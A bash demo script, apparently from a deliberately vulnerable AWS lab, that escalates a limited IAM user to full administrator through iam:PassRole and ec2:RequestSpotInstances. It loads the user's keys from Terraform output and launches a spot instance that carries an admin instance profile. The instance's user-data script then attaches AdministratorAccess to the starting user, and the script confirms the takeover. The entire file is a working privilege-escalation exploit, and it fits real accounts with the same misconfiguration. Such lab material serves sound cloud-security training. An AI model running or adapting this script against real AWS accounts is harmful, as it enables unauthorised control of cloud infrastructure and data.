#!/bin/bash

# Demo script for iam:PassRole + ec2:RequestSpotInstances privilege escalation
# This script demonstrates how a user with PassRole and RequestSpotInstances can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-prrsi-to-admin-starting-user"
ADMIN_ROLE="pl-prod-prrsi-to-admin-target-role"
INSTANCE_PROFILE="pl-prod-prrsi-to-admin-instance-profile"
DEMO_INSTANCE_TAG="pl-prrsi-to-admin-demo-spot-instance"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + EC2 RequestSpotInstances Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_ec2_requestspotinstances.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Prepare user-data script to grant admin access
echo -e "${YELLOW}Step 5: Preparing EC2 user-data script to grant admin access${NC}"
echo "This script will attach AdministratorAccess policy to the starting user"

# Create user-data script
USER_DATA=$(cat <<EOF
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

STARTING_USER_NAME="${STARTING_USER}"

# Wait for IAM role to be available
sleep 15

# Attach AdministratorAccess policy to the starting user
aws iam attach-user-policy \
  --user-name \$STARTING_USER_NAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "AdministratorAccess attached to \$STARTING_USER_NAME successfully"
EOF
)

# Base64 encode user-data for safe passing (tr -d removes newlines for valid JSON)
USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')

echo -e "${GREEN}✓ User-data script prepared${NC}\n"

# Step 6: Get AMI ID for EC2 instance
echo -e "${YELLOW}Step 6: Finding Amazon Linux 2023 AMI${NC}"
AMI_ID=$(aws ec2 describe-images \
    --region $AWS_REGION \
    --owners amazon \
    --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text)

if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
    echo -e "${YELLOW}Could not find Amazon Linux 2023 AMI, trying Amazon Linux 2...${NC}"
    AMI_ID=$(aws ec2 describe-images \
        --region $AWS_REGION \
        --owners amazon \
        --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" \
        --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
        --output text)
fi

if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
    echo -e "${RED}Error: Could not find suitable AMI${NC}"
    exit 1
fi

echo "Using AMI: $AMI_ID"
echo -e "${GREEN}✓ Found AMI${NC}\n"

# Step 7: Get VPC and subnet for spot instance
echo -e "${YELLOW}Step 7: Determining VPC and subnet for spot instance${NC}"

# Get default VPC and subnet
DEFAULT_VPC=$(aws ec2 --region $AWS_REGION describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text)

if [ "$DEFAULT_VPC" = "None" ] || [ -z "$DEFAULT_VPC" ]; then
    echo -e "${RED}Error: No default VPC found. This demo requires a default VPC.${NC}"
    echo "Please create a default VPC or modify the script to use a specific VPC."
    exit 1
fi

DEFAULT_SUBNET=$(aws --region $AWS_REGION ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text)

echo "Using VPC: $DEFAULT_VPC"
echo "Using Subnet: $DEFAULT_SUBNET"
echo "Using Region: $AWS_REGION"
echo -e "${GREEN}✓ Network configuration ready${NC}\n"

# Step 8: Create spot instance launch specification
echo -e "${YELLOW}Step 8: Preparing spot instance launch specification${NC}"

# Create launch specification JSON
LAUNCH_SPEC=$(cat <<EOF
{
  "ImageId": "$AMI_ID",
  "InstanceType": "t3.micro",
  "IamInstanceProfile": {
    "Name": "$INSTANCE_PROFILE"
  },
  "UserData": "$USER_DATA_B64",
  "NetworkInterfaces": [
    {
      "DeviceIndex": 0,
      "SubnetId": "$DEFAULT_SUBNET",
      "AssociatePublicIpAddress": true
    }
  ]
}
EOF
)

echo -e "${GREEN}✓ Launch specification prepared${NC}\n"

# Step 9: Request spot instance with admin role
echo -e "${YELLOW}Step 9: Requesting spot instance with admin instance profile${NC}"
echo "This is the privilege escalation vector - passing the admin role to a spot instance..."
echo "Instance profile: $INSTANCE_PROFILE"

# Request spot instance
SPOT_REQUEST_OUTPUT=$(aws ec2 request-spot-instances \
    --region $AWS_REGION \
    --spot-price "0.05" \
    --instance-count 1 \
    --type "one-time" \
    --launch-specification "$LAUNCH_SPEC" \
    --output json)

SPOT_REQUEST_ID=$(echo "$SPOT_REQUEST_OUTPUT" | jq -r '.SpotInstanceRequests[0].SpotInstanceRequestId')

if [ -z "$SPOT_REQUEST_ID" ] || [ "$SPOT_REQUEST_ID" = "null" ]; then
    echo -e "${RED}Error: Failed to request spot instance${NC}"
    exit 1
fi

echo "Spot Instance Request ID: $SPOT_REQUEST_ID"
echo -e "${GREEN}✓ Spot instance request submitted${NC}\n"

# Step 10: Wait for spot request to be fulfilled
echo -e "${YELLOW}Step 10: Waiting for spot request to be fulfilled${NC}"
echo "This may take 1-2 minutes..."
echo ""

MAX_WAIT=180  # 3 minutes
WAIT_TIME=0
INSTANCE_ID=""

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Check spot request status
    SPOT_STATUS=$(aws ec2 describe-spot-instance-requests \
        --region $AWS_REGION \
        --spot-instance-request-ids $SPOT_REQUEST_ID \
        --query 'SpotInstanceRequests[0]' \
        --output json 2>/dev/null || echo "{}")

    STATE=$(echo "$SPOT_STATUS" | jq -r '.State // "unknown"')
    STATUS_CODE=$(echo "$SPOT_STATUS" | jq -r '.Status.Code // "unknown"')

    if [ "$STATE" = "active" ] && [ "$STATUS_CODE" = "fulfilled" ]; then
        INSTANCE_ID=$(echo "$SPOT_STATUS" | jq -r '.InstanceId')
        echo -e "\n${GREEN}✓ Spot request fulfilled! Instance ID: $INSTANCE_ID${NC}\n"
        break
    elif [ "$STATE" = "failed" ] || [ "$STATE" = "cancelled" ] || [ "$STATE" = "closed" ]; then
        echo -e "\n${RED}Error: Spot request failed with state: $STATE${NC}"
        echo "Status: $STATUS_CODE"
        exit 1
    fi

    echo -n "."
    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

echo ""

if [ -z "$INSTANCE_ID" ] || [ "$INSTANCE_ID" = "null" ]; then
    echo -e "${RED}Error: Spot request not fulfilled within timeout${NC}"
    echo "Spot Request ID: $SPOT_REQUEST_ID"
    exit 1
fi

# Step 11: Wait for policy attachment to complete
echo -e "${YELLOW}Step 11: Waiting for user-data script to attach AdministratorAccess${NC}"
echo "This may take 2-3 minutes while the instance starts and executes the script..."
echo ""

MAX_WAIT=300  # 5 minutes
WAIT_TIME=0
POLICY_ATTACHED=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Check if AdministratorAccess is attached to the starting user
    ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' --output text 2>/dev/null || echo "")

    if [ "$ATTACHED_POLICIES" == "AdministratorAccess" ]; then
        echo -e "${GREEN}✓ Policy attachment complete! AdministratorAccess attached to starting user${NC}\n"
        POLICY_ATTACHED=true
        break
    fi

    echo -n "."
    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

echo ""

if [ "$POLICY_ATTACHED" = false ]; then
    echo -e "${RED}Error: Policy attachment did not complete within timeout${NC}"
    echo "Instance ID: $INSTANCE_ID"
    echo "Spot Request ID: $SPOT_REQUEST_ID"
    echo "You may need to check the instance logs or increase the timeout"
    exit 1
fi

# Step 12: Verify admin access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "The starting user now has AdministratorAccess attached..."
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole + ec2:RequestSpotInstances)"
echo "2. Requested spot instance with admin instance profile ($ADMIN_ROLE)"
echo "3. Spot instance attached AdministratorAccess policy to starting user via user-data"
echo "4. Achieved: Administrator Access (directly on starting user)"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (PassRole + RequestSpotInstances) → Spot Instance with $ADMIN_ROLE"
echo -e "  → (AttachUserPolicy AdministratorAccess) → $STARTING_USER → Admin"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Spot Instance Request: $SPOT_REQUEST_ID"
echo "- Spot Instance: $INSTANCE_ID"
echo "- AdministratorAccess policy attached to: $STARTING_USER"

echo -e "\n${RED}⚠ Warning: AdministratorAccess policy has been attached to the starting user${NC}"
echo -e "${RED}⚠ The spot instance is still running and incurring charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
